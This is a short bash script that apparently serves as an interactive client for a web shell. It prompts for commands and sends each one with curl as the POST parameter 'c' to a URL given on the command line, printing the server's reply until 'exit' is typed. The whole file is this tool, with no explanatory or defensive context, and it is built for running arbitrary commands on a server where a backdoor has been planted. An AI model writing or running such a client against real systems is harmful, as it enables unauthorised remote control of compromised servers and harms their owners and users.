#!/bin/bash

if [[ $# -le 0 ]]
then
    echo "Enter a url"
    exit 0
fi

URL=$1

while [[ True ]]
do
    read -p "$ " command
    echo "$command"

    if [[ $command == "exit" ]]
    then
        break;
    fi

    curl -s -X POST \
        --data-urlencode "c=$command" \
        $1
    echo ""
done

exit

